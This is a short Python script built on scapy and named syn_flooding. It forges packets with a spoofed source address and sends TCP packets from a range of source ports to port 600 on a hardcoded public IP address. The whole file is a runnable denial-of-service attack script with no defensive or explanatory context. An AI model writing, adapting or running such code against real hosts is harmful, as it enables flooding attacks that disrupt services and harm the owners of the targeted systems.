from scapy.all import *

def syn_flooding(source, target):
    for source_port in range(100, 150):
        ip_layer = IP(src=source, dst=target)
        tcp_layer = TCP(sport=source_port, dport=600)
        pkt_ = ip_layer/tcp_layer
        send(pkt_)


source = "127.0.0.1"
target = "162.241.24.197"
syn_flooding(source, target)